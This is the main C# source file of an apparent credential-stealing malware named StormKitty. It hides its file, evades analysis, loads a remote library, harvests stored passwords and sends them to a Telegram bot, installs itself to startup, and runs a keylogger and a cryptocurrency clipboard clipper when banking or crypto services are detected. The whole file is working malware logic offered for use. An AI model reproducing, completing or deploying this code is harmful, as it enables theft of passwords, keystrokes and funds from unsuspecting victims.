using Stealer;
using System;
using System.Net;
using System.Threading;

namespace StormKitty
{
    class Program
    {
        [System.STAThreadAttribute]
        static void Main(string[] args)
        {
            Thread 
                W_Thread = null,
                C_Thread = null;
            
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.DefaultConnectionLimit = 9999;

            Implant.MutexControl.Check();

            if (!Implant.Startup.IsFromStartup())
                Implant.Startup.HideFile();

            if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
                Implant.SelfDestruct.Melt();

            if (Config.StartDelay == "1")
                Implant.StartDelay.Run();

            if (Implant.AntiAnalysis.Run())
                Implant.AntiAnalysis.FakeErrorMessage();

            System.IO.Directory.SetCurrentDirectory(Paths.lappdata);

            if (!Libs.LoadRemoteLibrary(Libs.ZipLib))
                Implant.AntiAnalysis.FakeErrorMessage();

            Config.DecryptConfig();

            if (!Telegram.Report.TokenIsValid())
                Implant.SelfDestruct.Melt();

            string passwords = Passwords.Save();

            string archive = Filemanager.CreateArchive(passwords);

            Telegram.Report.SendReport(archive);

            // Install to startup if enabled in config and not installed
            if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices))
                if (!Implant.Startup.IsInstalled() && !Implant.Startup.IsFromStartup())
                    Implant.Startup.Install();

            // Run keylogger module
            if (Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1")
            {
                Console.WriteLine("Starting keylogger modules...");
                W_Thread = WindowManager.MainThread;
                W_Thread.SetApartmentState(ApartmentState.STA);
                W_Thread.Start();
            }

            // Run clipper module
            if (Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1")
            {
                Console.WriteLine("Starting clipper modules...");
                C_Thread = ClipboardManager.MainThread;
                C_Thread.SetApartmentState(ApartmentState.STA);
                C_Thread.Start();
            }

            // Wait threads
            if (W_Thread != null) if (W_Thread.IsAlive) W_Thread.Join();
            if (W_Thread != null) if (C_Thread.IsAlive) C_Thread.Join();

            if (!Implant.Startup.IsFromStartup())
                Implant.SelfDestruct.Melt();
        }
    }
}
